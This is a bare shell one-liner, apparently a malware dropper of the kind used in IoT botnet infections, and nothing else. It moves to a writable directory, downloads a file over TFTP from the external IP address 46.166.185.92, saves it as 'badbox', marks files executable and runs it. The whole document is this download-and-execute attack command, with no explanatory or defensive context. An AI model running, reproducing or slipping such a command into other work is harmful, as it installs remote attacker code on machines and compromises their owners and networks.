cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 46.166.185.92;cat sh >badbox;chmod +x *;./badbox
